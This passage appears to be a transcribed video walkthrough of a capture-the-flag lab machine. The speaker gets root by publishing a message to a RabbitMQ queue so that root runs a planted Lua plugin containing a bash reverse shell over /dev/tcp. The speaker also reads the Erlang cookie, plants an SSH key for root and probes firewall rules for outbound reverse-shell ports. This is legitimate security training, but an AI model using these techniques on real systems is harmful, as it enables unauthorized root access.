the key and we have copied it over so ch mod plus x p spy and then i'm also going to copy the pcap again so dev shm stir back home and let's run piece by while we wireshark this so maybe a cron will go off and that cron will let us see the password that's being used in a script if they have it on command line and looking through this again i see yunto password and then this so let's try that password for yantel erling alerts right now i'm looking to see if they expose the erlang cookie in this rabbitmq thing it doesn't look like they did search for cookie don't have it but let's go back here yanto and we will do that we didn't get an error message that time so let's listen on 9001 and put this port and oh we are so we published the message but nothing happened so let's see let's try taking the routing key off and it actually works we get something um let's try taking the we went back to the source of amqp publish which i think i thought we had it up here they have exchange as nothing and this is bar and this is saying directly to rabbitmq so let's erase the exchange and leave plug-in data so if we copy that second example would have worked right away yep it would have so i'm not sure exactly what's going on but sometimes it helps to try multiple examples so now we are sending the plugin to cubewrite if i read this note correctly so we cut this and it's telling yunto to send the url and to a let's see please publish all cube right plugins created by players on plug-in data exchange and queue so we're just pushing it to probably the queue which is maybe the routing key or maybe we did it up above but we've got that piece working so we sent the url to the download plugin and now the code is pulling it and reviewing it so we probably need to google like cube right plugin cube right is that how they spell it uh let's see erlang yeah it's right here cube rite plugin and see exactly what this is see if i can cheat a little bit so it says all plugins are written in lua lua which is a very common um language and lua has a method of getting code execution with just os.execute which is like os.system and python or system and php so let's try this um i'm going to do i have send here send pane2 yes i do so send this pane to five and now we have two sessions um i'm going to oh there's another hint if we go through this piece by output of uh root running lua on something and then removing so i'm curious what else there is here rootworksub.php you can get so much information just from looking at like these prospekman things something's running in screen but anyways what we want to do is let's see go to dev shm v dub dub dub maker dub dub dub and we're going to uh edit please subscribe.lua i'm just going to put os dot oh is it execute or system now i think execute then we'll do bash dash c bash dash i dev tcp 12701 9001 0 and 1 like that i think we ended in a semicolon so let's do python three dash m http server 9001 nc lvmp 9001 oh uh 9002 which i do there we go then let's go [Music] back here i'm going to send this to 5 go to 5. so what we're going to do is publish this again and we're going to tell it to hit please subscribe lua let's put the port here so we should see this go off of us pushing this url into this queue and then well this url into the queue and that's gonna cause it to hit a page which then gets us a shell send we sent it and i don't see a shell actually ls so os dot execute did not work maybe it's os dot system actually what we can do is cap this real quick and try running this i don't know why it lost oh it just took a second but we got a shell as root awesome uh let's see cd slash root and we could read root.text so that is the box i'm gonna try something though because i'm curious about this about rabbit so if we psef grep on rabbit that is running as the rabbitmq user um ps ef grep erl that's not it i'm pretty sure it would just be the rabbit mq user if we exploit this successfully so let's go to cd slash etsy find dot uh two dev null and i'm doing this as an unprivileged user uh dash i cookie let's see erl cd etsy find dot grap cookie so maybe it's not there let's just do a slash see what all cookies are there we go here's the erlang cookie we want verlib rabbit mq so we can go to verlib rabbit mq and the erlang cookie is there it's only readable by the rabbitmq user so we can't get it um of course with root we can so let's go there verlib rabbit mq and then cat.erlang cookie and we get the cookie here so we're gonna try to do this it's been so long so i've done anything erlang um see if we can use this to get this machine to execute commands so first we should check if erlang is installed it doesn't look like it is so sudo apt install erlang yes and it shouldn't take too long to install hopefully and it looks like it's processing so pause the video and we'll come back when it's done now that it's installed let us try the erl command again looks like we can abort with control g i'm trying to um p kill erl there we go so let's try erl s name this doesn't matter this is our node name and set cookie to the erlang cookie okay and we can try net kernel connect 10 10 10 190 undefined function net kernel does that get removed from rolling net kernel connect 10 10 10 190. um connect zero what i'm not sure what's going on now i swear this is all i did in the canopy video let's see let's google it real quick uh url net kernel connect i wonder if it's like disabled see i wonder what happens if i do it on the remote box here so we'll go to fellow moss erl s name hipsec dash s cookie paste net kernel connect node localhost false let's try rabbit localhost false rabbit mq i'm getting really confused so i guess i don't know enough about oh god i just pasted i don't know enough about this to actually go through with it so if you want to you can play around with erlang and if you do do it let me know in the comments exactly what you did because it's been a while but i highly recommend like watching the canopy video because that's when i was playing with it um we just searched berlin so read this go to this post by mubix to look at it it's a super cool exploit vector but there's one other thing i want to look at whenever i see like um happy table rules i always like knowing like a good firewall i want to like enumerate to figure out exactly what's going on and it looks like uh what let's see i'm just going to copy my new key here let's exit this pane and cat dub dub dub uh was it zip sec ipsec it's going to put this key in root so we can ssh in as root and i want to look at the firewall rules i think i just said that echo dash n paste authorized keys then sh dash i ipsec root at 10 10 10 190 there we go iptables ip tables dash capital l we probably want like dash n to not resolve dns and it's using ufw awesome i hate ufw it's like uncomplicated firewall that somehow made iptables so much more complicated to me so let's see before input there's so many rules so drop say or if there's like ufw dump rules list and delete firewall rules with ufw uh let's see ufw status verbose let's see ufw status numbered sweet so there are a few that are actually allowed outbound um i'm guessing this may be due to how he wrote the rule i'm not sure if it was intended to allow these outbounds but you do see this occasionally from time to time where someone does a firewall rule or these are ipv6 but they do an ip tables rule or something or a firewall like on a cisco and just say allow port 53 and they don't specify inbound and outbound so it defaults to both ways so for this box you need to do memcache so he probably wrote a ufw rule like ufw port allow one one two one one is what i'm guessing he wrote i think that's a command is it uh ufw see enable maybe allow port one one two one one from stir let's see you can tell i don't use ufw um allow for it but i'm trying to go through probably what he did because i'm not sure if um fellow moss i think he's the one that created this box uses ufw either so let's see ufw allow 22. so you don't specify port you just say allow port or allow so that's probably what he did so let's try adding um 9001 and let's do ufw status numbered and we look at 9001 it's only allowed in so i'm not sure exactly what he did to allow both ways but if we went back to like the minecraft plug-in or did anything else we have two ports that we can hit so if we exit this we do nc lvnp 9001 we can't hit 9001 so nc 10 10 10 190 9001 blocked but if we listened on one one two one one we should be able to oh shoot um what is my ip i'm 10 10 14 2. so i'm on uh 10 10 10 190 so 9001 can't hit it but one one two one one we can so we could have done a reverse shell on that port so whenever you come up against a firewall rule if you if like my webshell didn't work if my ssh key didn't work i would have started trying ports that i know are listening in order to see if they did this firewall rule to allow both ways i'm not sure exactly the command he did to set it up but yeah that'll be the box hope you guys enjoyed it take care and i'll see you all next week